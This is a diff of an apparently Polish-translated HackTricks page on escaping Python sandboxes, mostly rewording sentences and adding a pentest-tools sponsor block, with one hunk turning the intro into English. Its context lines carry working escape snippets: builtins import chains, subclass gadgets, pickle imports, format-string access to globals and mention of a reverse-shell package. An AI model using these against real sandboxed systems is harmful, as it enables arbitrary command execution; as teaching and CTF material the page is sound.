@@ -15,11 +15,21 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 </details>
 {% endhint %}
 
-To są niektóre sztuczki, aby obejść zabezpieczenia piaskownicy Pythona i wykonać dowolne polecenia.
+<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-## Biblioteki do wykonywania poleceń
+#### Get a hacker's perspective on your web apps, network, and cloud
 
-Pierwszą rzeczą, którą musisz wiedzieć, jest to, czy możesz bezpośrednio wykonać kod za pomocą już zaimportowanej biblioteki, lub czy możesz zaimportować którąkolwiek z tych bibliotek:
+**Znajdź i zgłoś krytyczne, wykorzystywalne luki w zabezpieczeniach, które mają rzeczywisty wpływ na biznes.** Użyj naszych 20+ niestandardowych narzędzi, aby zmapować powierzchnię ataku, znaleźć problemy z bezpieczeństwem, które pozwalają na eskalację uprawnień, oraz użyj automatycznych exploitów, aby zebrać niezbędne dowody, przekształcając swoją ciężką pracę w przekonujące raporty.
+
+{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
+
+
+
+These are some tricks to bypass python sandbox protections and execute arbitrary commands.
+
+## Command Execution Libraries
+
+The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -58,7 +68,7 @@ Pamiętaj, że funkcje _**open**_ i _**read**_ mogą być przydatne do **czytani
 Funkcja **input()** w Pythonie 2 pozwala na wykonywanie kodu Pythona przed awarią programu.
 {% endhint %}
 
-Python próbuje **ładować biblioteki z bieżącego katalogu jako pierwsze** (następujące polecenie wydrukuje, skąd Python ładuje moduły): `python3 -c 'import sys; print(sys.path)'`
+Python próbuje **załadować biblioteki z bieżącego katalogu jako pierwsze** (następujące polecenie wydrukuje, skąd Python ładuje moduły): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (559).png>)
 
@@ -68,7 +78,7 @@ Python próbuje **ładować biblioteki z bieżącego katalogu jako pierwsze** (n
 
 Możesz znaleźć **listę wstępnie zainstalowanych** pakietów tutaj: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 Zauważ, że z pickle możesz sprawić, że środowisko Pythona **zaimportuje dowolne biblioteki** zainstalowane w systemie.\
-Na przykład, poniższy pickle, po załadowaniu, zaimportuje bibliotekę pip do jej użycia:
+Na przykład, następujący pickle, po załadowaniu, zaimportuje bibliotekę pip, aby jej użyć:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -97,13 +107,13 @@ Możesz pobrać pakiet do stworzenia reverse shell tutaj. Proszę, pamiętaj, ż
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
 {% hint style="info" %}
-Ten pakiet nazywa się `Reverse`. Jednak został specjalnie stworzony tak, aby po wyjściu z reverse shell reszta instalacji zakończyła się niepowodzeniem, więc **nie zostawisz żadnego dodatkowego pakietu python na serwerze** po wyjściu.
+Ten pakiet nazywa się `Reverse`. Jednak został specjalnie stworzony, aby po wyjściu z reverse shell reszta instalacji zakończyła się niepowodzeniem, więc **nie zostawisz żadnego dodatkowego pakietu python na serwerze** po wyjściu.
 {% endhint %}
 
 ## Eval-ing kodu python
 
 {% hint style="warning" %}
-Zauważ, że exec pozwala na wieloliniowe ciągi i ";", ale eval nie (sprawdź operatora walrus).
+Zauważ, że exec pozwala na wieloliniowe ciągi i ";", ale eval nie (sprawdź operatora walrus)
 {% endhint %}
 
 Jeśli pewne znaki są zabronione, możesz użyć **hex/octal/B64** reprezentacji, aby **obejść** ograniczenie:
@@ -152,7 +162,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Bypassing protections through encodings (UTF-7)
 
-W [**tym artykule**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 jest używany do ładowania i wykonywania dowolnego kodu python wewnątrz pozornej piaskownicy:
+W [**tym artykule**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 jest używane do ładowania i wykonywania dowolnego kodu python wewnątrz pozornie izolowanego środowiska:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -167,7 +177,7 @@ Możliwe jest również ominięcie tego za pomocą innych kodowań, np. `raw_uni
 
 ## Wykonanie Pythona bez wywołań
 
-Jeśli jesteś w więzieniu Pythona, które **nie pozwala na wywołania**, wciąż istnieją sposoby na **wykonywanie dowolnych funkcji, kodu** i **poleceń**.
+Jeśli jesteś w pułapce Pythona, która **nie pozwala na wywołania**, istnieją nadal sposoby na **wykonanie dowolnych funkcji, kodu** i **komend**.
 
 ### RCE z [dekoratorami](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -197,7 +207,7 @@ Jeśli możesz **zadeklarować klasę** i **utworzyć obiekt** tej klasy, możes
 
 #### RCE z niestandardowymi klasami
 
-Możesz modyfikować niektóre **metody klas** (_przez przeciążenie istniejących metod klas lub tworzenie nowej klasy_), aby sprawić, że będą **wykonywać dowolny kod** po **wywołaniu** bez bezpośredniego ich wywoływania.
+Możesz modyfikować niektóre **metody klas** (_przez przeciążanie istniejących metod klas lub tworzenie nowej klasy_), aby sprawiały, że **wykonują dowolny kod** po **wywołaniu** bez bezpośredniego ich wywoływania.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -319,15 +329,15 @@ pass
 ```
 ## Builtins
 
-* [**Funkcje wbudowane Pythona 2**](https://docs.python.org/2/library/functions.html)
-* [**Funkcje wbudowane Pythona 3**](https://docs.python.org/3/library/functions.html)
+* [**Funkcje wbudowane w python2**](https://docs.python.org/2/library/functions.html)
+* [**Funkcje wbudowane w python3**](https://docs.python.org/3/library/functions.html)
 
 Jeśli masz dostęp do obiektu **`__builtins__`**, możesz importować biblioteki (zauważ, że możesz również użyć tutaj innej reprezentacji ciągu pokazanej w ostatniej sekcji):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
-### Brak Wbudowanych
+### No Builtins
 
 Kiedy nie masz `__builtins__`, nie będziesz w stanie zaimportować niczego ani nawet czytać lub pisać plików, ponieważ **wszystkie funkcje globalne** (jak `open`, `import`, `print`...) **nie są załadowane**.\
 Jednak **domyślnie python importuje wiele modułów do pamięci**. Te moduły mogą wydawać się nieszkodliwe, ale niektóre z nich **również importują niebezpieczne** funkcjonalności, które można wykorzystać do uzyskania **dowolnego wykonania kodu**.
@@ -454,7 +464,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### Znajdowanie niebezpiecznych załadowanych bibliotek
 
-Na przykład, wiedząc, że z biblioteką **`sys`** możliwe jest **importowanie dowolnych bibliotek**, możesz wyszukać wszystkie **moduły załadowane, które mają zaimportowane sys w sobie**:
+Na przykład, wiedząc, że z biblioteką **`sys`** możliwe jest **importowanie dowolnych bibliotek**, możesz wyszukać wszystkie **załadowane moduły, które mają zaimportowane sys w sobie**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -678,7 +688,7 @@ Możesz sprawdzić wynik tego skryptu na tej stronie:
 
 ## Python Format String
 
-Jeśli **wyślesz** **ciąg** do pythona, który ma być **formatowany**, możesz użyć `{}` do uzyskania dostępu do **wewnętrznych informacji pythona.** Możesz użyć wcześniejszych przykładów, aby uzyskać dostęp do globals lub builtins na przykład.
+Jeśli **wyślesz** **ciąg** do Pythona, który ma być **formatowany**, możesz użyć `{}`, aby uzyskać dostęp do **wewnętrznych informacji Pythona.** Możesz użyć wcześniejszych przykładów, aby uzyskać dostęp do globals lub builtins na przykład.
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -702,12 +712,12 @@ Zauważ, jak możesz **uzyskać dostęp do atrybutów** w normalny sposób za po
 
 Zauważ również, że możesz użyć `.__dict__`, aby wyliczyć elementy obiektu `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Niektóre inne interesujące cechy ciągów formatu są możliwością **wykonywania** **funkcji** **`str`**, **`repr`** i **`ascii`** w wskazanym obiekcie, dodając **`!s`**, **`!r`**, **`!a`** odpowiednio:
+Niektóre inne interesujące cechy formatów ciągów to możliwość **wykonywania** **funkcji** **`str`**, **`repr`** i **`ascii`** w wskazanym obiekcie, dodając **`!s`**, **`!r`**, **`!a`** odpowiednio:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Ponadto możliwe jest **kodowanie nowych formatterów** w klasach:
+Ponadto, możliwe jest **kodowanie nowych formatterów** w klasach:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -721,7 +731,7 @@ return 'HAL 9000'
 **Więcej przykładów** dotyczących **formatu** **łańcucha** można znaleźć na [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Sprawdź także następującą stronę w poszukiwaniu gadżetów, które r**ead sensitive information from Python internal objects**:
+Sprawdź również następującą stronę w poszukiwaniu gadżetów, które r**ead sensitive information from Python internal objects**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -786,7 +796,7 @@ Wyzwanie w rzeczywistości wykorzystuje inną lukę w serwerze, która pozwala n
 ## Analiza obiektów Pythona
 
 {% hint style="info" %}
-Jeśli chcesz **nauczyć się** o **bytecode Pythona** w głębi, przeczytaj ten **świetny** post na ten temat: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Jeśli chcesz **nauczyć się** o **bajtkodzie Pythona** w głębi, przeczytaj ten **świetny** post na ten temat: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
 W niektórych CTF-ach możesz otrzymać nazwę **niestandardowej funkcji, w której znajduje się flaga** i musisz zobaczyć **wnętrze** **funkcji**, aby ją wyodrębnić.
@@ -912,7 +922,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Zauważ, że **jeśli nie możesz zaimportować `dis` w piaskownicy Pythona**, możesz uzyskać **bajtowy kod** funkcji (`get_flag.func_code.co_code`) i **zdekompilować** go lokalnie. Nie zobaczysz zawartości zmiennych, które są ładowane (`LOAD_CONST`), ale możesz je zgadnąć z (`get_flag.func_code.co_consts`), ponieważ `LOAD_CONST` również informuje o przesunięciu zmiennej, która jest ładowana.
+Zauważ, że **jeśli nie możesz zaimportować `dis` w piaskownicy Pythona**, możesz uzyskać **bytecode** funkcji (`get_flag.func_code.co_code`) i **rozłożyć** go lokalnie. Nie zobaczysz zawartości zmiennych, które są ładowane (`LOAD_CONST`), ale możesz je zgadnąć z (`get_flag.func_code.co_consts`), ponieważ `LOAD_CONST` również informuje o przesunięciu zmiennej, która jest ładowana.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -937,7 +947,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Kompilowanie Pythona
 
 Teraz wyobraźmy sobie, że w jakiś sposób możesz **zrzucić informacje o funkcji, której nie możesz wykonać**, ale **musisz** ją **wykonać**.\
-Jak w następującym przykładzie, **możesz uzyskać dostęp do obiektu kodu** tej funkcji, ale tylko czytając disassemble **nie wiesz, jak obliczyć flagę** (_wyobraź sobie bardziej złożoną funkcję `calc_flag`_)
+Jak w poniższym przykładzie, **możesz uzyskać dostęp do obiektu kodu** tej funkcji, ale tylko czytając disassemble **nie wiesz, jak obliczyć flagę** (_wyobraź sobie bardziej złożoną funkcję `calc_flag`_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -972,7 +982,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-W zależności od wersji Pythona, **parametry** `code_type` mogą mieć **inny porządek**. Najlepszym sposobem, aby poznać kolejność parametrów w wersji Pythona, którą uruchamiasz, jest uruchomienie:
+W zależności od wersji Pythona, **parametry** `code_type` mogą mieć **inny porządek**. Najlepszym sposobem na poznanie kolejności parametrów w wersji Pythona, którą uruchamiasz, jest uruchomienie:
 ```
 import types
 types.CodeType.__doc__
@@ -1070,6 +1080,14 @@ will be bypassed
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
+<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+
+#### Uzyskaj perspektywę hakera na swoje aplikacje internetowe, sieć i chmurę
+
+**Znajdź i zgłoś krytyczne, wykorzystywalne luki w zabezpieczeniach, które mają rzeczywisty wpływ na biznes.** Użyj naszych 20+ niestandardowych narzędzi, aby zmapować powierzchnię ataku, znaleźć problemy z bezpieczeństwem, które pozwalają na eskalację uprawnień, i użyj zautomatyzowanych exploitów, aby zebrać niezbędne dowody, przekształcając swoją ciężką pracę w przekonujące raporty.
+
+{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
+
 {% hint style="success" %}
 Ucz się i ćwicz Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
 Ucz się i ćwicz Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
@@ -1079,8 +1097,8 @@ Ucz się i ćwicz Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt=
 <summary>Wsparcie HackTricks</summary>
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 {% endhint %}
